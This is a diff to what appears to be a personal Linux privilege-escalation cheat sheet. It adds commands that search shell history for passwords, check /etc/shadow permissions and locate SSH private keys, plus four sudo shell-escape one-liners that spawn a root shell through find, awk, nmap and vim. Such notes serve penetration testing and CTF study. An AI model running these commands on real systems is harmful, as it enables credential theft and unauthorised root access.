@@ -1,5 +1,18 @@
  
 Introduction
+
+Stored Passwords
+cat ~/.bash_history | grep -i passw
+
+Weak Permissions
+ls -la /etc/shadow
+
+Find SSH Keys
+
+find / -name authorized_keys 2> /dev/null
+find / -name id_rsa 2> /dev/null
+
+
 Basic Linux Priv Esc: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
 
 Linux Priv Esc PayloadAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
@@ -45,7 +58,12 @@ SUID vs. Capabilities: https://mn3m.info/posts/suid-vs-capabilities/
 
 Capabilites Priv Esc w/ OpennSLL and Selinux enabled and enforced: https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099
 
-
+Sudo Shell Escapaing
+1. In command prompt type any of the following:
+a. sudo find /bin -name nano -exec /bin/sh \;
+b. sudo awk 'BEGIN {system("/bin/sh")}'
+c. echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
+d. sudo vim -c '!sh'
 
 Enumerate for version
 
